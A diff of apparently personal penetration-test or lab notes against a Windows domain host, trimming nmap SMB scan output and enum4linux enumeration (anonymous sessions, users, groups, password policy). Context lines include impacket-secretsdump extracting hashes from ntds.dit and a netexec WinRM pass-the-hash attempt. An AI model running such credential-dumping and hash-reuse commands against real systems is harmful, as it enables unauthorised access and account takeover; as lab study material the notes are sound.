@@ -2,29 +2,17 @@
 ## NMAP
 
 ```
-# Nmap 7.94SVN scan initiated Wed Jul 24 19:18:10 2024 as: nmap -vv --reason -Pn -T4 -sV -p 139 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /home/kali/... -oX /home/kali/... TARGET
+# Nmap 7.94SVN scan initiated Wed Jul 24 19:18:10 2024 as: nmap -vv --reason -Pn -T4 -sV -p 139 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" TARGET
 Nmap scan report for TARGET
 Host is up, received user-set (0.068s latency).
 Scanned at 2024-07-24 19:18:10 EDT for 40s
-
-PORT    STATE SERVICE     REASON          VERSION
-139/tcp open  netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn
-|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+PORT      STATE SERVICE        VERSION
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
 Host script results:
-|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
-|_smb2-capabilities: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
-|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
-|_smb-print-text: false
 |_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
-|_smb-protocols: No dialects accepted. Something may be blocking the responses
 |_smb2-time: ERROR: Script execution failed (use -d to debug)
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jul 24 19:18:50 2024 -- 1 IP address (1 host up) scanned in 40.44 seconds
-
 ```
 ## enum4linux 
 
@@ -39,13 +27,9 @@ Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
  ==========================( Enumerating Workgroup/Domain on TARGET )==========================
 
-
 [E] Can't find workgroup/domain
-
-
 
  ==============================( Nbtstat Information for TARGET )==============================
 
@@ -54,9 +38,7 @@ No reply from TARGET
 
  ==================================( Session Check on TARGET )==================================
 
-
 [+] Server TARGET allows sessions using username '', password ''
-
 
  ===============================( Getting domain SID for TARGET )===============================
 
@@ -65,16 +47,12 @@ Domain Sid: S-1-5-21-537427935-490066102-1511301751
 
 [+] Host is part of a domain (not a workgroup)
 
-
  =================================( OS information on TARGET )=================================
-
 
 [E] Can't get OS info with smbclient
 
-
 [+] Got OS info for TARGET from srvinfo: 
 do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
-
 
  ======================================( Users on TARGET )======================================
 
@@ -117,10 +95,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 [+] Attempting to map shares on TARGET
 
-
  ==========================( Password Policy Information for TARGET )==========================
-
-
 
 [+] Attaching to TARGET using a NULL share
 
@@ -155,17 +130,12 @@ Unable to connect with SMB1 -- no workgroup available
 	[+] Account Lockout Threshold: None
 	[+] Forced Log off Time: Not Set
 
-
-
 [+] Retieved partial password policy with rpcclient:
-
 
 Password Complexity: Enabled
 Minimum Password Length: 7
 
-
  =====================================( Groups on TARGET )=====================================
-
 
 [+] Getting builtin groups:
 
@@ -262,17 +232,13 @@ Group: 'Domain Users' (RID: 513) has member: resourced\G.Goldberg
 
  =================( Users on TARGET via RID cycling (RIDS: 500-550,1000-1050) )=================
 
-
 [E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
-
 
  ==============================( Getting printer info for TARGET )==============================
 
 do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
 
-
 enum4linux complete on Wed Jul 24 19:29:42 2024
-
 
 ```
 
@@ -280,8 +246,6 @@ enum4linux complete on Wed Jul 24 19:29:42 2024
 
 ```
 Doing NBT name scan for addresses from TARGET
-
-
 
 ```
 
@@ -295,7 +259,6 @@ Anonymous login successful
 	---------       ----      -------
 Reconnecting with SMB1 for workgroup listing.
 Unable to connect with SMB1 -- no workgroup available
-
 
 ```
 
@@ -320,7 +283,6 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 ![Pasted image 20240724194426.png](Evidence/Pasted%20image%2020240724194426.png)
-
 
 ```
 netexec winrm TARGET -u users.txt -H hashes.txt
